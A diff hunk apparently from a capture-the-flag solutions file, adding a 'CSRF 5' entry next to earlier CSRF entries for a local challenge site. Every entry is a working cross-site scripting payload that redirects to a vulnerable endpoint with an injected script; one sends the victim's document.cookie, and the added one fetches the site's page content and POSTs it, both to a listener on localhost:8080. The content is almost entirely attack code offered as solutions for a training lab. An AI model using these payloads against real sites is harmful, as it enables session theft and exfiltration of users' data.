@@ -103,3 +103,5 @@ except Exception as e:
       <script>window.location.replace("http://challenge.localhost/ephemeral?msg=<script>alert('PWNED');"+"</sc"+"ript>");</script>
     CSRF 4
       <script>window.location.replace("http://challenge.localhost/ephemeral?msg=<script>fetch('http://localhost:8080', {method: 'POST', body: document.cookie});"+"</sc"+"ript>");</script>
+    CSRF 5
+      <script>window.location.replace("http://challenge.localhost/ephemeral?msg=<script>fetch('http://challenge.localhost/', {method: 'GET'}).then(response => response.text()).then(text => { return fetch('http://localhost:8080', {method: 'POST', headers: {'Content-Type': 'text/plain'}, body: text})});"+"</sc"+"ript>");</script>
